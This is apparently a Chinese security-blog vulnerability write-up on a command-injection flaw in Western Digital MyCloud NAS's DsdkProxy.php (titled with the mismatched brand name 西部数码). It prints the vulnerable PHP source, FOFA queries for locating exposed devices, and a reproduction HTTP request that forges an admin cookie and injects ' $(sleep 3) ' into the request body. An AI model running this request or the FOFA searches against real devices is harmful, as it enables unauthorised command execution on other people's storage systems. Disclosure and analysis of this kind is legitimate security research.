---
title: "西部数码 NAS DsdkProxy.php 命令执行漏洞"
source: https://mrxn.net/jswz/west-nas-DsdkProxy-rce.html
asset_dir: assets/西部数码-nas-dsdkproxy.php-命令执行漏洞
---

# 西部数码 NAS DsdkProxy.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/9/7 12:45
* 498浏览
* [0评论](#comment)
* 21分钟阅读

深入探索

云安全解决方案

企业安全咨询

Docker加速服务


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件，支持多种设备的备份和共享。Western Digital MyCloud NAS DsdkProxy.php中存在[命令执行](https://mrxn.net/tag/rce)漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。

# 影响版本

<=2.11.153（老版本，已发布修复补丁）

漏洞预警服务

# fofa语法

> icon\_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"
>
> body="\_PROJECT\_MODEL\_ID\_YOSEMITE " && body="\_PROJECT\_MODEL\_ID\_LIGHTNING "

# 漏洞分析

深入探索

编码转换工具

SQL注入防护

JSON处理工具

直接看 `DsdkProxy.php` 其业务实现逻辑如下

```
<?php

include ("../lib/login_checker.php");

/* login_check() return 0: no login, 1: login, admin, 2: login, normal user */

if (login_check() != 1) {
    http_response_code(401);
    goto __exit;
}

$postOrPutRequest = ($_SERVER['REQUEST_METHOD'] == 'POST' || $_SERVER['REQUEST_METHOD'] == 'PUT');

$curlCommand = 'sudo curl -i -s --unix-socket "/var/run/wdappmgr.sock" -X ';
$curlCommand .= $_SERVER['REQUEST_METHOD'];
$curlCommand .= ' ';

if ($postOrPutRequest) {
    $curlCommand .= ' -d ';
    $curlCommand .= '\'';
    $curlCommand .= file_get_contents('php://input');
    $curlCommand .= '\'';
}

$curlCommand .= ' ';
$curlCommand .= 'http://localhost/';
$curlCommand .= $endpoint;

if (!$postOrPutRequest && $_SERVER['QUERY_STRING'] != null) {
    $curlCommand .= '?';
    $curlCommand .= $_SERVER['QUERY_STRING'];
}
$curlCommand .= ' 2>&1';

$output = shell_exec($curlCommand);

$startPos = strpos($output, ' ');
$httpCode = substr($output, $startPos + 1, 3);
$body = "";

if(($pos = strpos($output, '[')) !== false || ($pos = strpos($output, '{')) !== false) {
   $body = substr($output, $pos);
} else {
   $body = $output;
}

header('Content-Type: application/json');
http_response_code($httpCode);
echo $body;
__exit:
?>
```

当处理 `POST` 或 `PUT` 请求时，它会将请求体内容 (`file_get_contents('php://input')`) 直接插入到 `curl` 命令的 `-d` 参数中，并且仅使用单引号进行包裹。攻击者可以通过在请求体中注入单引号来闭合现有字符串，然后注入任意的 `curl` 参数或 shell 命令，因为最终的命令字符串会被 `shell_exec()` 执行，导致了[命令注入](https://mrxn.net/tag/rce)漏洞。尽管此漏洞需要管理员权限才能触发，但可以结合`login_check`的权限绕过达到 RCE的效果。

漏洞预警服务

# 漏洞复现

```
POST /web/dsdk/DsdkProxy.php HTTP/1.1
Host: west-nas.mrxn.ent
Cookie: isAdmin=1;username=admin
Content-Type: application/x-www-form-urlencoded

' $(sleep 3) '
```

[![西部数码 NAS DsdkProxy.php 命令执行漏洞](images/img-001-08438a440f58.webp)](https://image.mrxn.net/08f70b5e17814fb18f7fe5a6fe852b99.webp)

成功延时 3 秒

代码安全审计

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#php](https://mrxn.net/tag/php)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[西部数码 NAS DsdkProxy.php 命令执行漏洞](https://mrxn.net/jswz/west-nas-DsdkProxy-rce.html)  
文章链接：<https://mrxn.net/jswz/west-nas-DsdkProxy-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/west-nas-DsdkProxy-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读

安全工具开发


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/west-nas-DsdkProxy-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 